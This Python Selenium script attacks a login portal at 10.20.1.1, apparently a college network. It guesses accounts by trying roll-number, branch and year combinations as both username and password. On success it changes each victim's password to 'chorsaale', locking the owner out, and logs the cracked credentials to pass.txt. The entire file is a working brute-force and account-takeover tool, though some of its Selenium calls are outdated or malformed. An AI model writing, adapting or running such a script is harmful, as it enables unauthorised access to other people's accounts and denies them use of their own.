from selenium import webdriver
from time import sleep
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.common.by import By

def sendValues(nameBox, passBox, submit, key):
    nameBox.send_keys(key)
    passBox.send_keys(key)
    submit.click()

def changePassword(b, key, newPass):
    b.get('http://10.20.1.1/corporate/webpages/login.jsp?webclient=myaccount')
    
    name = b.find_element_by_name('username')
    password = b.find_element_by_name('password')
    submit = b.find_element_by_name('loginbutton')
    sendValues(name, password, submit, key)
    
    try:
        WebDriverWait(b, 10).until(EC.presence_of_element_located(By.ID, 'mymenu_menu0_0'))
        b.find_element_by_id('mymenu_menu0_0').click()
        WebDriverWait(b, 10).until(EC.presence_of_element_located(By.ID, 'mymenu_menu0_0_0'))
        b.find_element_by_id('mymenu_menu0_0_0').click()
    except:
        return
    
    old = b.find_element_by_id('oldpasswd')
    new = b.find_element_by_id('passwordpasswd')
    confirm = b.find_element_by_id('confirmpasswordpasswd')
    old.send_keys(key)
    new.send_keys(newPass)
    confirm.send_keys(newPass)
    b.find_element_by_name('btnupdate').click()
    b.find_element_by_id('toppanelLogoutBnt2').click()
    
    return True

def storeValues(key):
    path = 'pass.txt'      ##Path of file where passwords are stored
    file = open(path,'a')
    file.write(key+'\n')
    file.close()

    
def check(b, key):
    msgBox = b.find_element_by_id('msgDiv')
    msg=msgBox.text.strip().lower()
    print(msg)
    myPass = 'chorsaale'        ##New password to be set
    if 'successfully' in msg:
        storeValues(key)
        return True
    elif 'limit' in msg:
        changePassword(b, key, myPass)
        storeValues(key)
        b.get('http://10.20.1.1:8090')
        return False

def run():
    b=webdriver.Chrome('C:\chromedriver')
    b.get('http://10.20.1.1:8090')
    nameBox = b.find_element_by_name('username')
    passBox = b.find_element_by_name('password')
    submit = b.find_element_by_name('btnSubmit')

    branches = ['mca','cse','ece']

    for year in range(16, 12, -1):
        for branch in branches:
            for roll_no in range(1,75):
                if roll_no<10:
                    roll='0'+str(roll_no)
                else:
                    roll=str(roll_no)
                nameBox.clear()
                passBox.clear()
                key = roll + branch + str(year)
                print('Cheking key : ',key)
                sendValues(nameBox, passBox, submit, key)
                print(len(b.window_handles))
                original_window = b.window_handles[0]
                try:
                    WebDriverWait(b, 0).until(EC.alert_is_present(),
                                   'Timed out waiting for PA creation ' +
                                   'confirmation popup to appear.')

                    alert = b.switch_to_alert()
                    alert.accept()
                    print("alert accepted")
                except:
                    print("no alert")
                if len(b.window_handles)>1:
                    new_window = b.window_handles[1]
                    b.switch_to_window(new_window)
                if check(b, key):
                    b.find_element_by_name('btnSubmit').click()      ## logout if login successfull
                    changePassword(b, key, 'chorsaale')
                    b.close()
                    
                    b.switch_to_window(original_window)
                    b.get('http://10.20.1.1:8090')
                    nameBox = b.find_element_by_name('username')
                    passBox = b.find_element_by_name('password')
                    submit = b.find_element_by_name('btnSubmit')
                
                
##try:                
run()
##except Exception as e:
##    print('Exception occured : ',str(e))
